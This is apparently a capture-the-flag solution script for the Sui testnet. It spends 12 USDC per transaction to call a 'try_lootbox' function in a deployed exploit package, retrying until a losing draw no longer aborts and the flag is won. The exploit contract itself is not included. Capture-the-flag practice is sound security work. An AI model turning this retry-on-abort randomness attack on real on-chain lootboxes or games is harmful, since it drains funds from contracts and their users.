import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

const EXPLOIT_PACKAGE_ID = "YOUR_DEPLOYED_EXPLOIT_PACKAGE_ID";
const USDC_TYPE = "0xa1ec02704253a6f30e6113b6326462725e22c06977755ba9b860ba525381a4b4::usdc::USDC";

(async () => {
  const tx = new Transaction();

  // 12 USDC (12,000,000 units)
  // Note: You'll need to fetch your USDC coin ID from Suiscan first
  const USDC_COIN_ID = "PASTE_YOUR_USDC_COIN_OBJECT_ID_HERE"; 
  const [payment] = tx.splitCoins(tx.object(USDC_COIN_ID), [12000000]);

  tx.moveCall({
    target: `${EXPLOIT_PACKAGE_ID}::solution::try_lootbox`, 
    arguments: [
      payment, 
      tx.object('0x8'), // The Shared Random object
    ],
  });

  try {
    const result = await suiClient.signAndExecuteTransaction({
      signer: keypair,
      transaction: tx,
    });
    console.log("Transaction processed. Check your account for the flag!");
  } catch (e) {
    console.log("Transaction aborted (this means you didn't win yet). Try again!");
  }
})();

